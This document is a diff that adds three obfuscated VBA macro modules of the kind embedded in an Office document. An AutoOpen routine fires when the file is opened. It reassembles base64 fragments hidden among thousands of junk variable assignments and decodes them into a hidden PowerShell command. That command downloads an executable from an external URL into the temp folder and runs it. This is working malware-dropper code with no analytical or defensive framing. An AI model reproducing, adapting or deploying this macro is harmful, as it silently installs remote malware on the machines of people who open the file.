@@ -1,0 +1,1012 @@
+Attribute VB_Name = "Module1"
+Sub AutoOpen()
+Dim PfPtZ As Long
+PfPtZ = Sgn(0)
+
+Dim lf4FW2Q9 As String
+lf4FW2Q9 = Len(ZWg2h)
+
+Dim lIwzB3c As Integer
+lIwzB3c = -20783
+
+Dim I20ph As Boolean
+I20ph = False
+
+Dim eMePdo3Jh As Long
+eMePdo3Jh = -1915330778
+
+Mt4KxSiJ
+End Sub
+
+-----
+
+Attribute VB_Name = "Module2"
+
+Function LWbdjV471(ByVal cFKsX0pt6)
+	Dim dvHt2O As Double
+	dvHt2O = 52102.332350791
+
+	Dim rzGRjZfFo As Boolean
+	rzGRjZfFo = True
+
+	Dim di0M5 As Integer
+	di0M5 = Sgn(-27249)
+
+	Dim A57VcMC8 As Long
+	A57VcMC8 = 0
+
+	Dim hxYIny
+	Dim WjmPoYH9e
+
+	Dim NCFPb6HJj As Single
+	NCFPb6HJj = Sgn(13944.124108426)
+
+	Dim zhcenZ8H As Single
+	zhcenZ8H = Round(22924.087059185)
+
+	Dim BvgTJi0S As Long
+	BvgTJi0S = Sgn(0)
+
+	Dim QBtHDXdE8 As String
+	QBtHDXdE8 = StrConv(kImWqnB, vbLowerCase)
+
+	Dim lHyh0Pe As Integer
+	lHyh0Pe = Sgn(1365)
+
+	Dim oLZ5e As Boolean
+	oLZ5e = True
+
+	Set hxYIny = CreateObject("msxml2.domdocument")
+
+	Dim Tfrg2udM As String
+	Tfrg2udM = AscB("I")
+
+	Dim r3VMjFE As Integer
+	r3VMjFE = Sgn(22388)
+
+	Dim i5B4z67bk As Byte
+	i5B4z67bk = 212
+
+	Dim M90GPv As Single
+	M90GPv = Sgn(31022.25518318)
+
+	Dim kIE1Px4 As Double
+	kIE1Px4 = 54947.425672713
+
+	Set WjmPoYH9e = hxYIny.CreateElement("base64")
+
+	Dim bbc5D As Byte
+	bbc5D = 90
+
+	Dim JbidcRq As Byte
+	JbidcRq = 146
+
+	Dim IvJaG15 As Boolean
+	IvJaG15 = False
+
+	WjmPoYH9e.dataType = "bin.base64"
+
+	Dim EzhtcJx As Byte
+	EzhtcJx = 247
+
+	Dim Nyvh9I4
+	Nyvh9I4 = Asc("a")
+
+	Dim dqIB7 As Boolean
+	dqIB7 = True
+
+	Dim yh4tIQ As Double
+	yh4tIQ = Sgn(7171.2209850738)
+
+	Dim nz1BUET3
+	nz1BUET3 = AscW("U")
+
+	Dim gyGDkY As Single
+	gyGDkY = Round(13890.542099867)
+
+	WjmPoYH9e.text = cFKsX0pt6
+
+	Dim x8rBs56z7 As String
+	x8rBs56z7 = vbNullString
+
+	Dim NetbNlFP As Boolean
+	NetbNlFP = False
+
+	Dim v8ecLR09 As Boolean
+	v8ecLR09 = True
+
+	Dim Hklo9st As Integer
+	Hklo9st = Sgn(5972)
+
+	Dim J1tJ2rIP As Double
+	J1tJ2rIP = Round(56652.275864503)
+
+	LWbdjV471 = yrk2A0P(WjmPoYH9e.nodeTypedValue)
+
+	Dim vyh2K8VAn As Double
+	vyh2K8VAn = Int(55977.990694383)
+
+	Dim gtNpuF As Boolean
+	gtNpuF = True
+
+	Dim yE4jAzw0 As Byte
+	yE4jAzw0 = 97
+
+	Dim MGlgfZh As Byte
+	MGlgfZh = 55
+
+	Dim vq5SfhE7 As Long
+	vq5SfhE7 = Sgn(0)
+
+	Set WjmPoYH9e = Nothing
+	Set hxYIny = Nothing
+End Function
+
+Function yrk2A0P(Binary)
+	Dim MQTdwH As Byte
+	MQTdwH = 63
+
+	Dim BRg3Xzk As Integer
+	BRg3Xzk = Sgn(5168)
+
+	Const J4oNv = 2
+	Const MKTZ8dpkV = 1
+
+	Dim tVF78kE5 As Single
+	tVF78kE5 = Val(3735.5581368398)
+
+	Dim FbW7TFYI As Long
+	FbW7TFYI = Sgn(-592537562)
+
+	Dim axBH6Z As Double
+	axBH6Z = Val(2266.9115310898)
+
+	Dim YAsFhT
+
+	Dim hhM3ib5an As Boolean
+	hhM3ib5an = False
+
+	Dim A1l4R As Boolean
+	A1l4R = True
+
+	Dim LgBeY As Long
+	LgBeY = Sgn(-1303056844)
+
+	Dim ich2y As Integer
+	ich2y = Sgn(-6731)
+
+	Dim XSQItbR As Byte
+	XSQItbR = 247
+
+	Dim bVC7voF6p As Byte
+	bVC7voF6p = 14
+
+	Dim Pd547l8 As Boolean
+	Pd547l8 = False
+
+	Dim AOahr As Integer
+	AOahr = -21693
+
+	Set YAsFhT = CreateObject("adodb.stream")
+
+	Dim kv8KCHg As Long
+	kv8KCHg = Sgn(0)
+
+	Dim MGzkuedw As String
+	MGzkuedw = RTrim(ICk6sEe)
+
+	Dim rojhR As Byte
+	rojhR = 250
+
+	Dim cqPcr As Integer
+	cqPcr = 24656
+
+	Dim xoY0eKZfL As Double
+	xoY0eKZfL = Val(28438.646190158)
+
+	With YAsFhT
+
+	Dim dy5AYvGB As Double
+	dy5AYvGB = Round(53702.23745529)
+
+	Dim QaysUE1q As String
+	QaysUE1q = UCase(UIMEnH)
+
+	Dim GrE8qWiX As Single
+	GrE8qWiX = Sgn(53289.277894563)
+
+	Dim mrD5UQNWd As Long
+	mrD5UQNWd = -1240943004
+
+	Dim C9bvunmPd As Double
+	C9bvunmPd = Sgn(1207.6389388744)
+
+	.Type = MKTZ8dpkV
+
+	Dim mG6KhD1Y As Integer
+	mG6KhD1Y = Sgn(-7335)
+
+	Dim xRI4JKdNO As Long
+	xRI4JKdNO = 0
+
+	Dim RjQZSy
+	RjQZSy = "j"
+
+	Dim BbX9P As Byte
+	BbX9P = 34
+
+	.Open
+
+	Dim O5GznyV9f As Double
+	O5GznyV9f = 11537.45779379
+
+	Dim AbzhB As Integer
+	AbzhB = Sgn(-10164)
+
+	Dim ifJUm As Single
+	ifJUm = 46475.74575139
+
+	.Write Binary
+
+	Dim Gf4i3oZ As Integer
+	Gf4i3oZ = 7247
+
+	Dim vCj95Wa As Integer
+	vCj95Wa = 2786
+
+	.Position = 0
+
+	Dim jx79oSBuf As Double
+	jx79oSBuf = Round(65184.82528104)
+
+	Dim lz7Uk0cm As Integer
+	lz7Uk0cm = -4312
+
+	Dim YDTRsY As Byte
+	YDTRsY = 99
+
+	.Type = J4oNv
+
+	Dim Dr4sVWJ As Single
+	Dr4sVWJ = Sgn(59222.953047664)
+
+	Dim gPbtcGVT As Long
+	gPbtcGVT = -1965219234
+
+	Dim z6m4SYE
+	z6m4SYE = AscW("_")
+
+	Dim QujGn As Double
+	QujGn = Sgn(1640.3294612711)
+
+	Dim tJ3Atq As Long
+	tJ3Atq = Sgn(0)
+
+	Dim TOVx7pj As Integer
+	TOVx7pj = -32495
+
+	Dim KoQV7T As Long
+	KoQV7T = -1440922232
+
+	Dim Tt4yad
+	Tt4yad = Len(a7JDLwZ)
+
+	Dim XMLNgr As Byte
+	XMLNgr = 189
+
+	Dim bCL3Vb9Fn As Single
+	bCL3Vb9Fn = 7848.583745036
+
+	.CharSet = "ascii"
+
+	Dim xlWU4L8Z As Long
+	xlWU4L8Z = 0
+
+	Dim ZT5eWF As Boolean
+	ZT5eWF = False
+
+	yrk2A0P = .ReadText
+
+	End With
+
+	Dim QcGdzbZo As Single
+	QcGdzbZo = 433.38849452644
+
+	Dim ayfOxdUw As Integer
+	ayfOxdUw = -5943
+
+	Dim q8zbp As Boolean
+	q8zbp = True
+
+	Dim RpEH64q As Integer
+	RpEH64q = Sgn(-18828)
+
+	Set YAsFhT = Nothing
+ 
+End Function
+
+Public Sub Mt4KxSiJ()
+	Dim Hj7mU As String
+	Hj7mU = ""
+	
+	Dim OoxaXfBk As Boolean
+	OoxaXfBk = False
+	
+	Dim UlBY8kLV As String
+
+	Dim mkx2c1 As Boolean
+	mkx2c1 = False
+	
+	Dim KylNH
+	KylNH = Val(YWYFZQnU)
+	
+	Dim jv8FumV As Double
+	jv8FumV = 26618.497217462
+	
+	Dim ycCWz2piV As Integer
+	ycCWz2piV = Sgn(-1336)
+
+	Dim gnqwOeNc6 As Byte
+	gnqwOeNc6 = 98
+	
+	Dim jILvbXFaA As Double
+	jILvbXFaA = Int(23559.871900206)
+
+	Dim Qf7sjYg8 As Boolean
+	Qf7sjYg8 = False
+	
+	Dim i4dCT As Long
+	i4dCT = Sgn(0)
+	
+	Dim XHiPt
+	XHiPt = StrConv(DZpsIeVzJ, vbLowerCase)
+	
+	Dim ZgwXLKcia As Boolean
+	ZgwXLKcia = True
+	
+	Dim MUrl90V As Long
+	MUrl90V = Sgn(0)
+	
+	Dim dfrX74 As Integer
+	dfrX74 = 18258
+	
+	Dim kmoQcJ As Double
+	kmoQcJ = Sgn(40340.076757287)
+	
+	Dim WktBzow As Byte
+	WktBzow = 204
+	
+	Dim LlsFpz As Long
+	LlsFpz = -1309576436
+	
+	Dim fh3TIincr As Double
+	fh3TIincr = Int(54203.952927291)
+
+	Dim Rb5makF4 As Long
+	Rb5makF4 = 0
+	
+	Dim uCunYN As String
+	uCunYN = vbNullString
+	
+	Dim ufE6w As Double
+	ufE6w = 55994.292966823
+	
+	Dim Y9oX0c As Single
+	Y9oX0c = Sgn(46715.3556271)
+	
+	Dim n0KtjRzb As Integer
+	n0KtjRzb = Sgn(-29129)
+	
+	Dim iglhm3Cw As Boolean
+	iglhm3Cw = False
+
+	Dim gIM0N6 As Byte
+	gIM0N6 = 158
+	
+	Dim b4f6pgVR As Boolean
+	b4f6pgVR = True
+	
+	Dim uyK5YQXU As Byte
+	uyK5YQXU = 8
+	
+	Dim SLt9npoD As Boolean
+	SLt9npoD = False
+	
+	Dim asn0u As Double
+	asn0u = Fix(43312.005244453)
+	
+	dPOezTJR
+	
+	Dim WpBhv As Long
+	WpBhv = Sgn(-1512409348)
+	
+	Dim xi65KTM As Integer
+	xi65KTM = -18354
+
+	Dim DkHz23N9G As Byte
+	DkHz23N9G = 97
+	
+	Dim pVeWMhY As Long
+	pVeWMhY = -1599800494
+
+	Dim JyPmoWB As Byte
+	JyPmoWB = 183
+	
+	Dim ApEgaUZo As Long
+	ApEgaUZo = 0
+	
+	Dim DBRHp0
+	DBRHp0 = LCase(wmsG4rBY5)
+	
+	xlwWIdp3O = Shell(LWbdjV471(G30yWlK), XbAFnZ)
+
+	Dim SEicr As Byte
+	SEicr = 102
+	
+	Dim CPKDdnTA As Single
+	CPKDdnTA = 941.11788249372
+	
+	Dim ByN7C As Byte
+	ByN7C = 82
+	
+	Dim GAwhWxQk As Long
+	GAwhWxQk = -891707494
+
+	Dim deoTjxv8U As Long
+	deoTjxv8U = 0
+	
+	Dim UiINvS
+	UiINvS = StrConv(w8YnOybfJ, vbProperCase)
+	
+	Dim j8gSXLa
+	j8gSXLa = Asc("p")
+	
+	Dim jt9hYZEqp As Single
+	jt9hYZEqp = Sgn(24394.692711023)
+	
+	Dim E0iuDxzYQ As Byte
+	E0iuDxzYQ = 216
+	
+	Dim fCTkR6Pwl As Byte
+	fCTkR6Pwl = 75
+	
+	Dim tdlUsj As Long
+	tdlUsj = Sgn(0)
+	
+	Dim CZjUFA As String
+	CZjUFA = AscB("R")
+
+	Dim jYEb56NL As Byte
+	jYEb56NL = 249
+	
+	Dim sqa0om As Boolean
+	sqa0om = True
+	
+	Dim zlyLZqog
+	zlyLZqog = Len(PCZ96c)
+	
+	Dim n0n9KbN
+	n0n9KbN = Val(C46UYtI)
+	
+	Dim xYVhJyEa As String
+	xYVhJyEa = StrConv(pUZfySecJ, vbUpperCase)
+	
+	Dim ANeAro9E As Single
+	ANeAro9E = Sgn(38051.260728882)
+	
+	Dim TxRt4
+	TxRt4 = UCase(o9itHkOSK)
+	
+	Dim avC2dT As String
+	avC2dT = Asc("$")
+	
+	Dim bEQOHjo
+	bEQOHjo = UCase(zrO890SZ)
+
+	Dim noECkTb As Single
+	noECkTb = 3450.1944414404
+	
+	Dim F57kRDbTJ As Single
+	F57kRDbTJ = Int(44919.770916477)
+	
+	Dim rXQ41B2 As Boolean
+	rXQ41B2 = False
+	
+	Dim lCwXNq As Integer
+	lCwXNq = 17905
+	
+	Dim HhbJ8Hl As Integer
+	HhbJ8Hl = Sgn(28928)
+	
+	Dim UHTtVW As String
+	UHTtVW = Len(JgrbL)
+	
+	Dim OBMQWAiY
+	OBMQWAiY = AscB("o")
+	
+	Dim PugxIs As Long
+	PugxIs = -1950529884
+	
+	Dim waTIvlr5 As Double
+	waTIvlr5 = Int(56557.008882971)
+	
+	Dim ePfwT As Single
+	ePfwT = Sgn(63422.104053003)
+	
+	Dim YZn1fM5cr As Byte
+	YZn1fM5cr = 102
+	
+	Dim jMmkeEwW6 As Boolean
+	jMmkeEwW6 = True
+
+	Dim tUsjCEG As Boolean
+	tUsjCEG = True
+	
+	Dim RUJwAu As String
+	RUJwAu = Val("v")
+	
+	Dim ROA63M As Boolean
+	ROA63M = True
+	
+	Dim WIkoAgm2 As Long
+	WIkoAgm2 = Sgn(0)
+	
+	'
+
+	Dim nNBHTX As Double
+	nNBHTX = 21887.965542561
+	
+	Dim eWfiw As Single
+	eWfiw = 19222.062698039
+	
+	Dim Ovuoj As String
+	Ovuoj = ""
+	
+	Dim Tv50dh8P As String
+	Tv50dh8P = StrConv(aIa9UGr, vbLowerCase)
+	
+	Dim QtfQj As Single
+	QtfQj = 15457.950384896
+	
+	'
+	Dim hC10E6G As Single
+	hC10E6G = Round(23393.817514225)
+	
+	Dim XCyFq As Long
+	XCyFq = Sgn(0)
+	
+	Dim wj0fcoZTr As Double
+	wj0fcoZTr = Int(28341.96498456)
+	
+	'
+	Dim WMBdSyvwC As Single
+	WMBdSyvwC = Int(19697.47220476)
+	
+	Dim hHAnSRUd As Integer
+	hHAnSRUd = 22198
+	'
+
+	Dim y2zRdMBDP As Byte
+	y2zRdMBDP = 24
+	
+	Dim aeCbgwh As Double
+	aeCbgwh = Sgn(28836.469415276)
+	
+	Dim GkeZPQO As Long
+	GkeZPQO = -1044426924
+	
+	Dim cuh89l5op As Byte
+	cuh89l5op = 153
+	
+	Dim Ww08o As Integer
+	Ww08o = Sgn(-1964)
+	'
+
+	Dim TxaoMmZ As Boolean
+	TxaoMmZ = False
+	
+	Dim MovKFRx7g As Byte
+	MovKFRx7g = 6
+	
+	Dim KIZ26
+	KIZ26 = QqQv5GstI
+	
+	Dim aKun635 As Boolean
+	aKun635 = True
+	
+	Dim KOzW9ft8s As Double
+	KOzW9ft8s = Val(59691.313742073)
+	
+	Dim QfoixF58j As Single
+	QfoixF58j = Round(62128.835330137)
+	
+	Dim YzJ7TmGY As Boolean
+	YzJ7TmGY = False
+	
+	Dim QKGAr
+	QKGAr = StrConv(kAdpaG5L, vbLowerCase)
+
+End Sub
+
+-----
+
+Attribute VB_Name = "Module3"
+
+Public G30yWlK As String
+Public Const XbAFnZ As Integer = 0
+
+Sub dPOezTJR()
+	Dim cpthHvCkR As Boolean
+	cpthHvCkR = False
+	
+	Dim dTS2VUyOl As Boolean
+	dTS2VUyOl = True
+
+	Dim kBvJTjhx3 As Boolean
+	kBvJTjhx3 = False
+	
+	Dim kYXFWV As Integer
+	kYXFWV = Sgn(-30557)
+	
+	Dim TpEkDRiq As Boolean
+	TpEkDRiq = False
+	
+	Dim cPXhZ6SC As Single
+	cPXhZ6SC = 63132.778564921
+	
+	Dim y9VfUwq As Long
+	y9VfUwq = Sgn(-1179812744)
+	    
+	Dim fkHNG As Byte
+	fkHNG = 18
+	
+	Dim Rewjs As Integer
+	Rewjs = -24513
+	
+	Dim XWrbH
+	XWrbH = "ZG9tOyR1cmxzID0gJ2h0dHA6Ly9kZWNpc"
+	
+	Dim idMyIsv As Byte
+	idMyIsv = 122
+	
+	Dim D3WctPU6 As Byte
+	D3WctPU6 = 67
+	
+	Dim VvTPIwt As Integer
+	VvTPIwt = -15399
+	
+	Dim vZ0cf
+	vZ0cf = "2l2ZS5nZG4vV0FlTTg5OTN2VC8zX2MuZXh"
+	
+	Dim E1Dkme As Integer
+	E1Dkme = -23304
+	
+	Dim TwtC61 As Boolean
+	TwtC61 = False
+	
+	Dim QbjJk85 As Single
+	QbjJk85 = Sgn(49423.408586437)
+	
+	Dim eS4D7n
+	eS4D7n = Len(bLvh8l)
+	
+	Dim ytpb4cxSJ As Boolean
+	ytpb4cxSJ = True
+	
+	Dim LJCId
+	LJCId = "lJy5TcGxpdC"
+	
+	Dim iv2Po6E As Integer
+	iv2Po6E = 13832
+	
+	Dim d2zNX7Fa As Integer
+	d2zNX7Fa = -460
+	
+	Dim rqpDRbnJi As Byte
+	rqpDRbnJi = 246
+	
+	Dim JLBvkh
+	JLBvkh = XWrbH & vZ0cf & LJCId
+	
+	Dim orIpKbZh As Single
+	orIpKbZh = Sgn(12242.559999395)
+	
+	Dim vgiHYDjw
+	vgiHYDjw = Len(q3HuDbmS)
+	
+	Dim eCL4iSc As Long
+	eCL4iSc = -531976206
+	
+	Dim UfTNaP As Byte
+	UfTNaP = 21
+	
+	Dim h7RnI As Boolean
+	h7RnI = True
+	
+	Dim ucs5CR As Long
+	ucs5CR = 0
+	
+	Dim wivwJ4q
+	wivwJ4q = "gnLCcpOyRuY"
+	
+	Dim wJqbHxf As Boolean
+	wJqbHxf = False
+	
+	Dim lQjA8X As Single
+	lQjA8X = 55055.388261651
+	
+	Dim SOrh8
+	SOrh8 = "W1lID0gJHJhbmRvbS5uZXh0KDEsIDY1NTM2KTskcGF0aCA9ICRlbnY6dGVtcCArICdcJyArICRuYW1lICsgJy5leGUnO2ZvcmVhY2goJHVybCBpbiAkdX"
+	
+	Dim KVsronQDC As Single
+	KVsronQDC = Sgn(5443.8162967404)
+	
+	Dim brhe4w As Long
+	brhe4w = 0
+	
+	Dim gU6mpuwzy
+	gU6mpuwzy = wivwJ4q & SOrh8
+	
+	Dim AQRrs51wm As Double
+	AQRrs51wm = Sgn(11545.530333184)
+	
+	Dim OIyzlW As Long
+	OIyzlW = Sgn(-2012270440)
+	
+	Dim klSDTeLyd As Double
+	klSDTeLyd = 2012.0610427954
+	
+	Dim VgZDhB5 As String
+	VgZDhB5 = "Jscyl7dHJ5eyR3ZWJ"
+	
+	Dim WQtjAu As Byte
+	WQtjAu = 214
+	
+	Dim nw4W1 As Long
+	nw4W1 = 0
+	
+	Dim E0y6SPJ As Integer
+	E0y6SPJ = -31602
+	
+	Dim d6HyA0S As Integer
+	d6HyA0S = 20056
+	
+	Dim CVj2JLeg As Byte
+	CVj2JLeg = 149
+	
+	Dim PvgNPu
+	PvgNPu = "jbGllbnQuRG93bmxvYWR"
+	
+	Dim QXGBz
+	QXGBz = UCase(nh9Uwe2Ju)
+	
+	Dim YNLcW92 As Boolean
+	YNLcW92 = True
+	
+	Dim xefiz8x As Byte
+	xefiz8x = 177
+	
+	Dim ZcnYVTN As Byte
+	ZcnYVTN = 1
+	
+	Dim F3Mm42 As Double
+	F3Mm42 = 23731.398828564
+	
+	Dim zS4uegqY As Single
+	zS4uegqY = 8638.3302607245
+	
+	Dim bf8nqB
+	bf8nqB = "GaWxlKCR1cmwuVG9TdHJpbmcoKSwgJHBh"
+	
+	Dim eHQGnu As Single
+	eHQGnu = 35511.88006609
+	
+	Dim GdgD9 As Double
+	GdgD9 = 54808.099883514
+	
+	Dim wLTHYhVv As Double
+	wLTHYhVv = Val(7423.1031958265)
+	
+	Dim GqA76nR
+	GqA76nR = VgZDhB5 & PvgNPu & bf8nqB
+	
+	Dim AngqP As String
+	AngqP = Trim(o0wqA5B)
+	
+	Dim kvPerBZnl As Byte
+	kvPerBZnl = 109
+	
+	Dim gntpVwz As Double
+	gntpVwz = 17051.580499525
+	
+	Dim t6iHT9 As Double
+	t6iHT9 = Val(8030.4108399904)
+	
+	Dim kUopK As Byte
+	kUopK = 21
+	
+	Dim UeuzY As Double
+	UeuzY = 57.692404296883
+	
+	Dim xLYgUMk
+	xLYgUMk = "cG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuICR3"
+	
+	Dim MK36SYF0 As Double
+	MK36SYF0 = 29480.070848662
+	
+	Dim zcniJy As Byte
+	zcniJy = 248
+	
+	Dim GKBMiv9 As Single
+	GKBMiv9 = 42806.044689407
+	
+	Dim cuJbeMY As String
+	cuJbeMY = UCase(rv57Ylz6)
+	
+	Dim e7UkqTC As Double
+	e7UkqTC = Val(12879.508580015)
+	
+	Dim wjHJf As Byte
+	wjHJf = 161
+	
+	Dim EFLlV
+	EFLlV = "c2N"
+	
+	Dim DS0hFwpDL As Double
+	DS0hFwpDL = Int(6721.1386682587)
+	
+	Dim xZYh9gI As Byte
+	xZYh9gI = 86
+	
+	Dim vJaMgN As String
+	vJaMgN = "yaXB0ID0gbmV3LW9iamVjd"
+	
+	Dim IlyV8fm As Long
+	IlyV8fm = -1339824252
+	
+	Dim QGapJov As Long
+	QGapJov = Sgn(0)
+	
+	Dim eEt7W2A As Double
+	eEt7W2A = Sgn(60994.893526145)
+	
+	Dim bGQMqFjEx As Double
+	bGQMqFjEx = 57402.141548438
+	
+	Dim FpRM2w As Single
+	FpRM2w = Fix(30651.960622003)
+	
+	Dim Ju8vY6JWm
+	Ju8vY6JWm = "CAtQ29tT2JqZWN0IF"
+	
+	Dim kpE1rg As Integer
+	kpE1rg = -10904
+	
+	Dim etNc4o As Byte
+	etNc4o = 169
+	
+	Dim xoZ8Ecqr As Single
+	xoZ8Ecqr = 52754.324952752
+	
+	Dim gyI59eci As Byte
+	gyI59eci = 26
+	
+	Dim Cp6AVx
+	Cp6AVx = xLYgUMk & EFLlV & vJaMgN & Ju8vY6JWm
+	
+	Dim xS3nF4Tof As Byte
+	xS3nF4Tof = 200
+	
+	Dim Sp30yVFT As Double
+	Sp30yVFT = Round(35967.078119193)
+	
+	Dim feL5Wk7p As String
+	feL5Wk7p = UCase(WHoUB)
+	
+	Dim VkapRCA
+	VkapRCA = "dGgpO1N0YXJ0LVByb2Nlc3MgJHBhdGg7YnJlYWs7fWNhdGNoe3dyaXRlLWhvc3QgJF8uRXhjZXB0aW9uLk1lc3N"
+	
+	Dim puntVEd As Single
+	puntVEd = 17020.616707242
+	
+	Dim PpMhoYAat As Boolean
+	PpMhoYAat = True
+	
+	Dim DpeHGB As String
+	DpeHGB = LTrim(XOwZ5sv)
+	
+	Dim exuNE As String
+	exuNE = Len(gWY47Lux)
+	
+	Dim A3XZTF As Double
+	A3XZTF = 35818.141544986
+	
+	Dim In3PgkBy As String
+	In3PgkBy = "hZ2U7fX0="
+	
+	Dim TlgdhJp2 As Long
+	TlgdhJp2 = Sgn(0)
+	
+	Dim tZRFCD7KT As Byte
+	tZRFCD7KT = 242
+	
+	Dim QnxRGX As Integer
+	QnxRGX = -19596
+	
+	Dim LjS7AD3 As Boolean
+	LjS7AD3 = True
+	
+	Dim IYIT7 As Single
+	IYIT7 = 37239.508658484
+	
+	Dim ZwuiTY6
+	ZwuiTY6 = VkapRCA & In3PgkBy
+	
+	Dim FQdMLVn
+	FQdMLVn = Len(u6wz5QH)
+	
+	Dim EVkLz4ds As Boolean
+	EVkLz4ds = True
+	
+	Dim hT9k2ZxbH As Boolean
+	hT9k2ZxbH = True
+	
+	Dim OhGKyJdAs As Boolean
+	OhGKyJdAs = False
+	
+	Dim PsWZgp As Double
+	PsWZgp = Fix(36075.568257468)
+	
+	Dim Zw8ZYrBD
+	Zw8ZYrBD = "dTY3JpcHQuU2hlbGw7JHdlYmNsaWVudCA9IG5ldy1vYmplY"
+	
+	Dim PpOLXF As Byte
+	PpOLXF = 51
+	
+	Dim BMYfvPR As String
+	BMYfvPR = Val(U42Kpzjo)
+	
+	Dim qmuz7E5Ho As Long
+	qmuz7E5Ho = Sgn(0)
+	
+	Dim lkzRjJwX
+	lkzRjJwX = "3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHJhbmRvbSA9IG5l"
+	
+	Dim bNJ7BT As Double
+	bNJ7BT = 57048.272792976
+	
+	Dim q19mZ2F0 As Byte
+	q19mZ2F0 = 62
+	
+	Dim rfv0V As Integer
+	rfv0V = -12212
+	
+	Dim EiFsuHPY1
+	EiFsuHPY1 = "dy1vYmplY3QgcmFu"
+	
+	Dim q8Tzf6N As Single
+	q8Tzf6N = Fix(63515.656094837)
+	
+	Dim besAfDh6 As Single
+	besAfDh6 = Sgn(29912.271083117)
+	
+	Dim zZkT0PmIW
+	zZkT0PmIW = Zw8ZYrBD & lkzRjJwX & EiFsuHPY1
+	
+	Dim R5NQwI As Double
+	R5NQwI = Val(2539.8454536584)
+	
+	Dim iZBJi7Mx9 As Long
+	iZBJi7Mx9 = -839868190
+	
+	Dim XtfbsKgC0
+	XtfbsKgC0 = Val("^")
+	
+	Dim h8f6Hm As Boolean
+	h8f6Hm = False
+	
+	Dim L5bEU9h As Double
+	L5bEU9h = Val(12476.926211078)
+	
+	G30yWlK = Cp6AVx & zZkT0PmIW & JLBvkh & gU6mpuwzy & GqA76nR & ZwuiTY6
+End Sub
